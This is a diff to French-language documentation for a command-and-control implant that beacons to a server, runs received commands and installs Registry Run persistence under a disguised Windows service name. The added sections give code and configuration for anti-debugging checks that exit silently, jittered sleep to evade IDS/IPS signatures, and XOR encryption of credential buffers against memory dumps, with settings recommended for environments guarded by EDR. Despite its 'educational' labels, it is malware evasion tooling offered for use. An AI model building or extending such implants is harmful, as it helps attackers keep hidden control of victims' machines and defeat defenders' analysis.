@@ -209,6 +209,130 @@ constexpr bool ANTI_VM_ENABLED = true;
 
 ---
 
+#### anti_debug
+**Type** : `boolean`  
+**Description** : Active les vérifications anti-débogage  
+**Défaut** : `false`
+
+```cpp
+constexpr bool ANTI_DEBUG_ENABLED = true;
+```
+
+**Méthodes de détection implémentées** :
+
+| Méthode | Description | Détail technique |
+|---------|-------------|-------------------|
+| IsDebuggerPresent | API Windows standard | Vérifie la flag du kernel |
+| PEB BeingDebugged | Lecture directe du PEB | Accès au champ `BeingDebugged` à 0x60 (x64) ou 0x30 (x86) |
+
+**Architecture spécifique** :
+- **x86_64** : Lecture via `__readgsqword(0x60)` pour accéder au PEB
+- **x86** : Lecture via `__readfsdword(0x30)` pour accéder au PEB
+
+**Comportement** :
+```mermaid
+flowchart TD
+    A[Démarrage Agent] --> B{Anti-Debug activé?}
+    B -->|Non| C[Continuer exécution]
+    B -->|Oui| D[Vérifications debug]
+    D --> E{Debugger détecté?}
+    E -->|Oui| F[Terminer silencieusement]
+    E -->|Non| C
+```
+
+**Cas d'usage éducatif** :
+- Démonstration de techniques anti-forensics
+- Illustration des mécanismes de protection dans les malwares
+- Étude du PEB (Process Environment Block) en sécurité Windows
+
+---
+
+#### sleep_obfuscation
+**Type** : `boolean`  
+**Description** : Active l'obfuscation des pauses (sleep) pour masquer le beacon interval  
+**Défaut** : `false`
+
+```cpp
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
+```
+
+**Types d'obfuscation disponibles** :
+
+1. **Sleep Obfusqué Simple** - Utilise les thread pools Windows
+   ```cpp
+   obfuscated_sleep(DWORD milliseconds);
+   ```
+   - Remplace `Sleep()` classique par `CreateThreadpoolTimer()`
+   - Évite les breakpoints faciles sur `Sleep()`
+   - Moins détectable par analyse dynamique
+
+2. **Sleep avec Jitter** - Ajoute une variabilité au beacon interval
+   ```cpp
+   obfuscated_sleep_with_jitter(DWORD baseMilliseconds, FLOAT jitterPercent);
+   ```
+   - Applique une variation aléatoire (±20% par défaut)
+   - Exemple : `SleepWithJitter(300000, 0.2f)` = 240-360 secondes
+   - Rend le trafic moins prévisible pour l'IDS/IPS
+
+3. **Sleep avec Chiffrement Mémoire** - Chiffre les données sensibles pendant le sleep
+   ```cpp
+   SleepWithEncryption(DWORD milliseconds, const std::vector<std::pair<PVOID, SIZE_T>>& regions);
+   ```
+   - Chiffre les régions mémoire spécifiées avant le sleep
+   - Déchiffre automatiquement après le réveil
+   - Protège contre les memory dumps lors du sleep
+   - Clé XOR 256-bit régénérée pour chaque session
+
+**Architecture interne** :
+
+```mermaid
+flowchart TD
+    A[obfuscated_sleep] --> B[SleepObfuscator::Initialize]
+    B --> C[CreateThreadpool]
+    C --> D[CreateThreadpoolCleanupGroup]
+    D --> E[InitializeThreadpoolEnvironment]
+    E --> F[CreateThreadpoolTimer]
+    F --> G[WaitForSingleObject]
+    G --> H[Cleanup ressources]
+```
+
+**Avantages sur Sleep() classique** :
+
+| Aspect | Sleep() | Obfuscated Sleep |
+|--------|---------|------------------|
+| Breakpoint facile | Oui | Non (thread pool) |
+| Détection trafic | Régulier/prévisible | Avec jitter: variable |
+| Mémoire non protégée | Lisible dump | Chiffrée (avec encryption) |
+| Compatibilité | 100% | 100% |
+| Performance | Native | +10-15% overhead |
+
+**Configuration complète dans config.h** :
+
+```cpp
+constexpr bool ANTI_DEBUG_ENABLED = true;
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
+constexpr FLOAT JITTER_PERCENT = 0.15f;  // ±15% de variation
+```
+
+**Exemple d'utilisation dans le cycle beacon** :
+
+```cpp
+// Au démarrage
+initialize_sleep_obfuscation();
+anti_debug_check();
+
+// Boucle beacon
+while (true) {
+    // Check-in serveur
+    beacon();
+    
+    // Sleep obfusqué avec jitter
+    obfuscated_sleep_with_jitter(BEACON_INTERVAL, JITTER_PERCENT);
+}
+```
+
+---
+
 #### use_https
 **Type** : `boolean`  
 **Description** : Force l'utilisation de HTTPS au lieu de HTTP  
@@ -261,18 +385,24 @@ stateDiagram-v2
     [*] --> Initialisation
     Initialisation --> AntiVM: Si activé
     AntiVM --> Terminé: VM détectée
-    AntiVM --> CollecteInfo: OK
-    Initialisation --> CollecteInfo: Anti-VM désactivé
+    AntiVM --> AntiDebug: OK
+    Initialisation --> AntiDebug: Anti-VM désactivé
     
-    CollecteInfo --> Beacon
+    AntiDebug --> Terminé: Debugger détecté
+    AntiDebug --> SleepInit: OK
+    
+    SleepInit --> CollecteInfo: Sleep obfuscation prête
+    
+    CollecteInfo --> Persistance
+    Persistance --> Beacon
     
     state Beacon {
         [*] --> CheckIn
         CheckIn --> AttenteCommandes
         AttenteCommandes --> Exécution: Commandes reçues
         Exécution --> SoumissionRésultats
-        SoumissionRésultats --> Sleep
-        Sleep --> CheckIn: Après beacon_interval
+        SoumissionRésultats --> SleepObfusque
+        SleepObfusque --> CheckIn: Après beacon_interval + jitter
     }
     
     Beacon --> Terminé: Erreur fatale
@@ -282,10 +412,24 @@ stateDiagram-v2
 ### 1. Initialisation
 - Chargement de la configuration
 - Initialisation des modules réseau
-- Vérification anti-VM (si activé)
-- **Installation de la persistance automatique** (si pas déjà installée)
+- Initialisation du pool de threads (pour sleep obfuscation)
 
-### 2. Collecte d'informations
+### 2. Vérifications anti-détection
+- **Anti-VM** (si `ANTI_VM_ENABLED = true`)
+  - 7 méthodes de détection
+  - Termine silencieusement si VM détectée
+  
+- **Anti-Debug** (si `ANTI_DEBUG_ENABLED = true`)
+  - Vérification `IsDebuggerPresent()`
+  - Vérification du PEB (BeingDebugged flag)
+  - Termine silencieusement si debugger détecté
+
+### 3. Préparation sleep obfuscation
+- Initialisation du `SleepObfuscator` (si `SLEEP_OBFUSCATION_ENABLED = true`)
+- Génération clé XOR 256-bit pour chiffrement mémoire
+- Création du thread pool Windows
+
+### 4. Collecte d'informations
 L'agent collecte automatiquement :
 - **hostname** : Nom de la machine
 - **username** : Utilisateur connecté (DOMAIN\user)
@@ -293,13 +437,24 @@ L'agent collecte automatiquement :
 - **process_name** : Nom du processus hôte
 - **os** : Version Windows
 
-### 3. Beacon (Check-in)
+### 5. Installation de la persistance
+- **Persistance automatique** (MITRE T1547.001)
+- Copie vers `%APPDATA%\Microsoft\Security\SecurityHealthService.exe`
+- Création clé Registry Run (user-level, pas admin requis)
+- Skippée si déjà installée
+
+### 6. Beacon (Check-in)
 Communication régulière avec le serveur :
 1. Envoi des informations système
 2. Réception des commandes en attente
 3. Exécution des commandes
 4. Soumission des résultats
-5. Sleep pendant `beacon_interval`
+5. Sleep obfusqué avec jitter pendant `beacon_interval`
+
+**Détails du Sleep** :
+- Si jitter activé : `base_interval * (1 ± jitter_percent)`
+- Utilise `CreateThreadpoolTimer()` au lieu de `Sleep()`
+- Optionnellement chiffre les régions mémoire sensibles
 
 ---
 
@@ -639,12 +794,19 @@ agent/
 │   ├── system_utils.cpp      # Infos système (hostname, IP, etc.)
 │   ├── system_utils.h
 │   ├── vm_detection.cpp      # Détection VM (7 méthodes)
+│   ├── debug_detection.cpp   # ⭐ Détection débogage (IsDebuggerPresent + PEB)
+│   ├── sleep_obfuscation.cpp # ⭐ Obfuscation sleep avec jitter + chiffrement mémoire
+│   ├── sleep_obfuscation.h
 │   ├── json.hpp              # Parser JSON (nlohmann)
 │   └── ReflectiveLoader/     # Génération shellcode
 │       └── DllLoaderShellcode/
 │           ├── shellcodize.py    # Convertisseur DLL → Shellcode
 │           └── Loader/           # Code du loader réflectif
 ```
+
+**Nouveautés** (⭐) :
+- `debug_detection.cpp` : Implémente deux méthodes anti-debug
+- `sleep_obfuscation.cpp/h` : Classe `SleepObfuscator` avec 3 stratégies de sleep
 
 ---
 
@@ -690,6 +852,298 @@ constexpr char RESULTS_PATH[] = "/api/v2/telemetry/collect";
 constexpr int BEACON_INTERVAL = 300;
 constexpr bool ANTI_VM_ENABLED = true;
 constexpr bool USE_HTTPS = true;
+```
+
+---
+
+## Anti-Détection Avancée
+
+### Anti-Debug (Détection de débogage)
+
+L'agent implémente deux méthodes complémentaires pour détecter un debugger actif :
+
+#### Méthode 1 : IsDebuggerPresent()
+
+```cpp
+bool anti_debug_basic() {
+    if (IsDebuggerPresent()) {
+        return true;  // Debugger détecté
+    }
+    return false;
+}
+```
+
+**Comment ça marche** :
+- API Windows standard fournie par `kernel32.dll`
+- Vérifie un flag interne du kernel
+- Retour très rapide (pas de I/O)
+
+**Limitations** :
+- Peut être contournée par API hooking
+- Des debuggers avancés peuvent spoofer cette API
+
+#### Méthode 2 : Vérification du PEB
+
+```cpp
+bool being_debugged_peb() {
+#if defined(_M_X64) || defined(__x86_64__)
+    PPEB peb = (PPEB)__readgsqword(0x60);  // x86_64
+#elif defined(_M_IX86) || defined(__i386__)
+    PPEB peb = (PPEB)__readfsdword(0x30);  // x86
+#endif
+    return peb->BeingDebugged;
+}
+```
+
+**Comment ça marche** :
+- Accès direct au **PEB** (Process Environment Block)
+- Le PEB est une structure interne Windows contenant infos du processus
+- x86_64 : GS:0x60 pointe vers le PEB
+- x86 : FS:0x30 pointe vers le PEB
+- Champ `BeingDebugged` (offset 0x2 dans le PEB) indique si debugger actif
+
+**Architecture** :
+
+```mermaid
+flowchart LR
+    subgraph x64["x86_64"]
+        A["__readgsqword(0x60)"] --> B["PEB*"]
+        B --> C["peb->BeingDebugged"]
+    end
+    
+    subgraph x86["x86"]
+        D["__readfsdword(0x30)"] --> E["PEB*"]
+        E --> F["peb->BeingDebugged"]
+    end
+```
+
+**Avantages** :
+- Lecture directe mémoire (bypass potentiel de certains hooks)
+- Plus fiable que `IsDebuggerPresent()`
+- Architecture-aware (32/64 bit)
+
+**Cas de détection** :
+- WinDbg, x64dbg, OllyDbg, etc.
+- Débogage user-mode
+- Certains reverse engineering tools
+
+#### Combinaison des deux méthodes
+
+```cpp
+void is_debugged() {
+    int detection_method = 0;
+    if (anti_debug_basic())     detection_method++;
+    if (being_debugged_peb())   detection_method++;
+    
+    // Si au moins une méthode détecte un debugger
+    if (detection_method > 0) {
+        // Terminer silencieusement
+        ExitProcess(0);
+    }
+}
+```
+
+**Seuil de détection** :
+- Agent s'arrête si ≥ 1 méthode détecte un debugger
+- Double protection : difficile de contourner les deux
+
+**Cas d'usage éducatif** :
+- Étude de structures Windows (PEB)
+- Apprentissage des mécanismes anti-forensics
+- Compréhension des protections malware
+- Analyse du comportement sous débogage
+
+---
+
+### Sleep Obfuscation (Obfuscation du beacon)
+
+L'agent remplace les appels `Sleep()` classiques par une implémentation plus sophistiquée utilisant les thread pools Windows.
+
+#### Motivation
+
+```
+Problème classique :
+    Agent beacon toutes les 5 minutes ← Très facile à détecter
+    - IDS/IPS peut créer une signature
+    - Trafic réseau prévisible
+    - Breakpoint trivial sur Sleep()
+
+Soltion avec Sleep Obfuscation :
+    Agent beacon avec jitter (4:30 - 5:30) ← Trafic variable
+    - Moins de certitude pour signature
+    - Trafic moins prévisible
+    - Breakpoint sur Sleep() ne fonctionne pas
+```
+
+#### Implémentation Technical
+
+**Classe SleepObfuscator** :
+```cpp
+class SleepObfuscator {
+private:
+    PTP_POOL threadPool;
+    PTP_CLEANUP_GROUP cleanupGroup;
+    TP_CALLBACK_ENVIRON callbackEnviron;
+    std::vector<BYTE> encryptionKey;
+    BOOL initialized;
+
+public:
+    BOOL Initialize();
+    BOOL Sleep(DWORD milliseconds);
+    BOOL SleepWithJitter(DWORD baseMilliseconds, FLOAT jitterPercent);
+    BOOL SleepWithEncryption(DWORD milliseconds, 
+                             const std::vector<std::pair<PVOID, SIZE_T>>& regions);
+};
+```
+
+#### Méthodes disponibles
+
+**1. Sleep Obfusqué Simple**
+
+```cpp
+obfuscated_sleep(5000);  // Sleep de 5 secondes
+```
+
+```mermaid
+sequenceDiagram
+    participant Agent
+    participant Timer as ThreadpoolTimer
+    participant Event
+
+    Agent->>Timer: CreateThreadpoolTimer()
+    Agent->>Timer: SetThreadpoolTimer(5000ms)
+    Agent->>Event: WaitForSingleObject(INFINITE)
+    Timer-->>Event: SetEvent (après 5s)
+    Event-->>Agent: Retour, exécution continue
+    Agent->>Timer: CloseThreadpoolTimer()
+```
+
+**Avantage** :
+- `Sleep()` utilise des mécanismes internes différents
+- Les breakpoints sur `Sleep()` ne s'activent pas
+- Moins d'analyse dynamique possible
+
+---
+
+**2. Sleep avec Jitter (Variable interval)**
+
+```cpp
+// Base 5 minutes, variation ±15%
+obfuscated_sleep_with_jitter(300000, 0.15f);
+// Résultat : 255000 à 345000 ms (4:15 - 5:45)
+```
+
+**Calcul du jitter** :
+```cpp
+FLOAT jitter = random(-jitterPercent, +jitterPercent);
+DWORD final_ms = baseMilliseconds * (1.0f + jitter);
+```
+
+**Distribution** (exemple avec 300000ms, 20% jitter) :
+```
+240000ms (4:00) ████████░░░░░░░░░░░░
+260000ms (4:20) ████████████░░░░░░░░
+280000ms (4:40) ████████████████░░░░
+300000ms (5:00) ████████████████████ ← Mode (espérance)
+320000ms (5:20) ████████████████░░░░
+340000ms (5:40) ████████████░░░░░░░░
+360000ms (6:00) ████████░░░░░░░░░░░░
+```
+
+**Impact** :
+- Signature trafic impossible (timing variable)
+- IDS/IPS doit chercher d'autres patterns
+- Ressemble plus à du trafic "humain"
+
+---
+
+**3. Sleep avec Chiffrement Mémoire**
+
+```cpp
+// Chiffrer certaines régions pendant le sleep
+std::vector<std::pair<PVOID, SIZE_T>> regions;
+regions.push_back({secret_data, 256});      // Données sensibles
+regions.push_back({credential_buffer, 512}); // Credentials
+
+obfuscator.SleepWithEncryption(300000, regions);
+```
+
+**Processus** :
+
+```mermaid
+flowchart LR
+    A["Données avant sleep<br/>Plaintext en RAM"] 
+    B["Chiffrement XOR<br/>256-bit key"] 
+    C["Sleep<br/>5 minutes"]
+    D["Déchiffrement XOR<br/>Même key"]
+    E["Données après sleep<br/>Plaintext en RAM"]
+    
+    A --> B --> C --> D --> E
+```
+
+**Clé XOR 256-bit** :
+```cpp
+void GenerateEncryptionKey() {
+    encryptionKey.resize(32);  // 256 bits
+    for (auto& byte : encryptionKey) {
+        byte = random(0, 255);  // Aléatoire
+    }
+}
+```
+
+**Avantage** :
+- Protection contre les **memory dumps** pendant le sleep
+- Si on dumpe la RAM à 3:00, les données sont chiffrées
+- À 3:05 quand l'agent se réveille, déchiffrement automatique
+
+**Limitation** :
+- Surcharge mémoire et CPU (±10-15%)
+- Performance acceptable pour la plupart des cas
+
+---
+
+#### Configuration recommandée
+
+```cpp
+// Pour environnement hostile (EDR, IDS/IPS)
+constexpr bool ANTI_DEBUG_ENABLED = true;
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
+constexpr FLOAT JITTER_PERCENT = 0.25f;     // ±25% variation
+constexpr int BEACON_INTERVAL = 600000;     // 10 minutes base
+
+// Pour POC/test
+constexpr bool ANTI_DEBUG_ENABLED = false;
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
+constexpr FLOAT JITTER_PERCENT = 0.0f;      // Pas de jitter
+constexpr int BEACON_INTERVAL = 5000;       // 5 secondes
+```
+
+#### Intégration dans le cycle beacon
+
+```cpp
+int main() {
+    // 1. Initialisation
+    initialize_sleep_obfuscation();
+    
+    // 2. Anti-detection checks
+    if (anti_debug_basic() || being_debugged_peb()) {
+        ExitProcess(0);
+    }
+    
+    // 3. Boucle principale
+    while (true) {
+        // Check-in auprès du serveur
+        beacon_checkin();
+        
+        // Récupération et exécution commandes
+        execute_pending_commands();
+        
+        // Sleep obfusqué avec jitter
+        obfuscated_sleep_with_jitter(BEACON_INTERVAL, JITTER_PERCENT);
+    }
+    
+    return 0;
+}
 ```
 
 ---
